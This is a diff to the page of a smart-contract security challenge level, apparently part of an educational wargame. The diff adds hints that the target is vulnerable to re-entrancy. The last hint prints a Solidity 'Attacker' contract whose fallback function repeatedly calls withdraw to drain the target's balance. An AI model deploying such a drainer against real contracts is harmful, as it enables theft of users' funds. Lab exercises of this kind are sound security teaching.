@@ -29,8 +29,9 @@
 
     <h3>Beat This Level</h3>
     <p>To beat this level, make the contract have a balance of 0</p>
+    <p>You will need to create and deploy your own smart contract to beat this level. Use <a href="https://remix.ethereum.org">Remix</a> to do this.</p>
 
-    <button id="hintButton" class="w3-button w3-amber w3-margin" onclick="getHint();">Get Hint (3)</button>
+    <button id="hintButton" class="w3-button w3-amber w3-margin" onclick="getHint();">Get Hint (2)</button>
     <div id="HintText" style="display: none;"></div>
 </div>
 
@@ -247,16 +248,44 @@ var Level = 1;
 function getHint(){
 
     var hintText = document.getElementById('HintText');
+    var hintBtn = document.getElementById('hintButton');
     hintText.style.display = "block";
-    hintText.innerHTML = "";
 
     if(Level == "1"){
-        hintText.innerHTML = "<p>Before Solidity v0.4.23, a function with the same name as the contract is the constructor function. This code is executed exactly once, when the contract is initially deployed. </p>";
-        document.getElementById('hintButton').innerHTML = "Hint (1/2)";
+        hintText.innerHTML = "<p>This contract is vulnerable to a re-entrancy attack.</p>";
+        hintBtn.innerHTML = "Hint (1/2)";
         Level = 2;
     } else if (Level == "2"){
-        hintText.innerHTML = "<p>Before Solidity v0.4.23, a function with the same name as the contract is the constructor function. This code is executed exactly once, when the contract is initially deployed. </p><p>In Solidity, function and variable names are case sensitive.</p>";
-        document.getElementById('hintButton').innerHTML = "Hint (2/2)";
+        hintText.innerHTML += "<p>Read about the DAOHack to find out how to exploit this vulnerability.</p>";
+        hintBtn.innerHTML = "Tell me how to do it";
+        Level = 3;
+    } else if (Level == "3"){
+        hintText.innerHTML += "<pre><code class=\"Javascript Tomorrow\">" +
+                "pragma solidity ^0.5.4;\n" +
+                "\n" +
+                "contract SimpleDAO {\n" +
+                "  mapping(address => uint) public balances;\n" +
+                "  function withdraw(uint _amount) public {}\n" +
+                "}\n" +
+                "\n" +
+                "contract Attacker {\n" +
+                "    SimpleDAO public original = SimpleDAO(**Deployed Contract Address**);\n" +
+                "    uint public amount = 0.1 ether;\n" +
+                "\n" +
+                "    constructor() public payable {}\n" +
+                "\n" +
+                "    function() external payable {\n" +
+                "        if (address(original).balance != 0 ) {\n" +
+                "            original.withdraw(amount); \n" +
+                "        }\n" +
+                "    }   \n" +
+                "}"+
+                "</code></pre>";
+        hintBtn.innerHTML = "Hint (2/2)";
+        hintBtn.style.display = "none";
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
     }
 }
 
